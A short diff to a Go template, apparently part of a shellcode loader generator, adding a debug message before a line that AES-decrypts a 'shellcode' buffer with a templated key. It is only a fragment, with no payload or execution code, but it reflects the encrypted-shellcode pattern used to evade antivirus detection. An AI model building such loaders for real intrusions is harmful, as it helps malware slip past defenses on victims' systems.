@@ -1,3 +1,6 @@
+{{if .Debug}}
+printDebug("info","Decrypt AES payload data")
+{{end}}
 shellcode, errAes := decryptAES(shellcode, "{{.Key}}")
 
 if errAes != nil {
